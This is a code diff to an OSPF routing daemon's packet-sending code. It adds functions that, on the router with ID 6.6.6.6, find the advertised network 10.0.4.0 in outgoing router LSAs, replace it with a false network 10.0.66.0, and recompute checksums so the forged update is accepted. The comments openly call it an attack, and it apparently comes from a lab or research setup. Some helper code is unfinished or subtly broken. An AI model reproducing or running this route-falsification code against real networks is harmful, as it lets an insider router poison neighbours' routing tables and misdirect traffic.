@@ -628,6 +628,201 @@ ospf_write_frags (int fd, struct ospf_packet *op, struct ip *iph,
 }
 #endif /* WANT_OSPF_WRITE_FRAGMENT */
 
+// mastinux - start
+/*
+	struct in_addr {
+		unsigned long s_addr;  // load with inet_aton()
+	};
+
+	struct lsa_header {
+		u_int16_t ls_age;
+		u_char options;
+		u_char type;
+		struct in_addr id;
+		struct in_addr adv_router;
+		u_int32_t ls_seqnum;
+		u_int16_t checksum;
+		u_int16_t length;
+	};
+
+	struct router_lsa {
+		struct lsa_header header;
+		u_char flags;
+		u_char zero;
+		u_int16_t links;
+		struct {
+			struct in_addr link_id;
+			struct in_addr link_data;
+			u_char type;
+			u_char tos;
+			u_int16_t metric;
+		} link[1];
+	};
+*/
+
+struct router_lsa * add_network_to_router_lsa(struct router_lsa *rl, const char *net){
+	struct router_lsa *new_rl;
+
+	new_rl = malloc(sizeof(struct router_lsa));
+
+	(new_rl->header).ls_age = (rl->header).ls_age;
+	(new_rl->header).options = (rl->header).options;
+	(new_rl->header).type = (rl->header).type;
+	(new_rl->header).id.s_addr = (rl->header).id.s_addr;
+	(new_rl->header).adv_router.s_addr = (rl->header).adv_router.s_addr;
+	(new_rl->header).ls_seqnum = (rl->header).ls_seqnum;
+	// checksum must be recomputed
+	//(new_rl->header).checksum = (rl->header).checksum;
+	
+	(new_rl->header).length = (rl->header).length;
+	
+	new_rl->flags = rl->flags;
+	new_rl->zero = rl->zero;
+	new_rl->links = rl->links + 1;
+
+	int i;
+	int len = ntohs (rl->header.length) - OSPF_LSA_HEADER_SIZE - 4;
+
+	for (i = 0; len > 0; i++)
+	{
+		len -= 12;
+	}
+
+	return new_rl;
+}
+
+int ospf_router_lsa_contains_net(struct stream *s, u_int16_t length, const char *net){
+	// 0 false
+	// 1 true
+
+	struct router_lsa *rl;
+	int i, len;
+	rl = (struct router_lsa *) STREAM_PNT (s);
+
+	len = ntohs (rl->header.length) - OSPF_LSA_HEADER_SIZE - 4;
+
+	//zlog_debug("######################### rl->header.length %d", ntohs (rl->header.length)); 	
+	//zlog_debug("###################### OSPF_LSA_HEADER_SIZE %d", OSPF_LSA_HEADER_SIZE);			
+	//zlog_debug("####################################### len %d", len);							
+
+	for (i = 0; len > 0; i++){
+		if ( strcmp(net, inet_ntoa (rl->link[i].link_id)) == 0 ){
+			// TODO alterate network link_id -> "10.0.66.0"
+			struct in_addr false_network;
+			inet_aton("10.0.66.0", &false_network);
+			rl->link[i].link_id = false_network;
+
+			return 1;
+		}
+
+		len -= 12;
+	}
+
+	return 0;
+}
+
+int ospf_packet_ls_upd_contains_network(struct stream *s, u_int16_t length, const char *net){
+	// 0 false
+	// 1 true
+
+	u_int32_t sp;
+	struct lsa_header *lsa;
+	int lsa_len;
+	u_int32_t count;
+
+	length -= OSPF_HEADER_SIZE;
+
+	sp = stream_get_getp (s);
+
+	count = stream_getl (s);
+	length -= 4;
+
+	zlog_debug ("Link State Update");
+	zlog_debug ("  # LSAs %d", count);
+
+	while (length > 0 && count > 0){
+		if (length < OSPF_HEADER_SIZE || length % 4 != 0){
+			zlog_debug ("  Remaining %d bytes; Incorrect length.", length);
+			break;
+		}
+
+		lsa = (struct lsa_header *) STREAM_PNT (s);
+		lsa_len = ntohs (lsa->length);
+
+		switch (lsa->type){
+			case OSPF_ROUTER_LSA:
+
+				if ( ospf_router_lsa_contains_net(s, length, net) ){
+					// TODO update router lsa checksum
+					u_int16_t length = lsa->length;
+					memset (&lsa->checksum, 0, sizeof (u_int16_t));
+					lsa->checksum = in_cksum (lsa, length);
+
+					return 1;
+				}
+
+				break;
+			default:
+				break;
+		}
+
+		stream_forward_getp (s, lsa_len);
+		length -= lsa_len;
+		count--;
+	}
+
+	stream_set_getp (s, sp);
+
+	return 0;
+}
+
+int ospf_packet_contains_network(struct ospf_packet *op, const char *net){
+	// 0 false
+	// 1 true
+
+	struct stream *s = op->s;
+	struct ospf_header *ospfh;
+	unsigned long gp;
+
+	/* Preserve pointer. */
+	gp = stream_get_getp (s);
+
+	/* OSPF Header dump. */
+	ospfh = (struct ospf_header *) STREAM_PNT (s);
+
+	/* Until detail flag is set, return. */
+	if (!(term_debug_ospf_packet[ospfh->type - 1] & OSPF_DEBUG_DETAIL))
+		return 0;
+
+	/* Show OSPF header detail. */
+	stream_forward_getp (s, OSPF_HEADER_SIZE);
+
+	switch (ospfh->type)
+	{
+		case OSPF_MSG_LS_UPD:
+			//ospf_packet_ls_upd_dump(s, ntohs (ospfh->length))
+
+			if ( ospf_packet_ls_upd_contains_network(s, ntohs (ospfh->length), net) ){
+				// TODO update ospf header checksum
+				u_int16_t length = ospfh->length;
+				memset (&ospfh->checksum, 0, sizeof (u_int16_t));
+				ospfh->checksum = in_cksum (ospfh, length);
+
+				return 1;
+			}
+
+			break;
+
+		default:
+			break;
+	}
+
+	stream_set_getp (s, gp);
+
+	return 0;
+}
+// mastinux - end
+
 static int
 ospf_write (struct thread *thread)
 {
@@ -758,6 +953,27 @@ ospf_write (struct thread *thread)
 
   /* send final fragment (could be first) */
   sockopt_iphdrincl_swab_htosys (&iph);
+
+	// mastinux - start
+	// TODO execute attack only on router-id 6.6.6.6
+	if ( strcmp(inet_ntoa(ospf->router_id_static), "6.6.6.6") == 0 ){
+		// struct in_addr router_id_static;
+		// struct in_addr { unsigned long s_addr;  // load with inet_aton() };
+		//zlog_debug ("################### router-id %u ####################", (ospf->router_id_static).s_addr);
+		//zlog_debug ("################### router-id %s ####################", inet_ntoa(ospf->router_id_static));
+	
+		if ( ospf_packet_contains_network(op, "10.0.4.0") ){
+			zlog_debug ("#####################################################");
+			zlog_debug ("################### mastinux ########################");
+			zlog_debug ("#####################################################");
+			zlog_debug ("################ INTERESTING PACKET ################");
+			zlog_debug ("#####################################################");
+			zlog_debug ("################### mastinux ########################");
+			zlog_debug ("#####################################################");
+		}
+	}
+	// mastinux - end
+
   ret = sendmsg (ospf->fd, &msg, flags);
   sockopt_iphdrincl_swab_systoh (&iph);
   
